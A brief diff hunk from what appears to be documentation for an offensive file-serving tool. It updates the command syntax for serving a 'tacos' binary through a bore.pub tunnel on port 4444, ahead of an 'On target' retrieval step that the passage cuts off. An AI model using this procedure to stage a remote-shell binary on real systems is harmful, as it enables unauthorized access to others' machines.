@@ -56,7 +56,7 @@ Now you can! Here is the procedure:
 bore local 9292 --to bore.pub
 
 ## Second tab, launch gitar (serve tacos of course)
-gitar -e bore.pub -p [BORE_PORT] -f 4444 -s demo
+gitar -a bore.pub:[BORE_PORT] -f 4444 -s demo
 
 # On target
 ## Retrieve tacos binary
